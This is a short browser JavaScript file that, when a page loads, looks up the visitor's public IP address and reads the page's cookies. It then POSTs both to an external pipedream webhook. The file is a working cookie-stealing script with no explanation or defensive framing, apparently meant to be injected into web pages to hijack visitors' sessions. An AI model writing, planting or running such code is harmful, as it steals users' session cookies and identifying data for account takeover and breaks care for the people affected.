async function getIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (err) {
    console.error('Failed to get IP:', err);
    return 'unknown';
  }
}

async function sendData() {
  const ip = await getIP();
  const cookies = document.cookie;

  const payload = { ip, cookies };

  fetch('https://eobwcepa8jfhqcn.m.pipedream.net', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  })
  .then(() => console.log('Data sent to webhook'))
  .catch(err => console.error('Error sending data:', err));
}

window.onload = sendData;
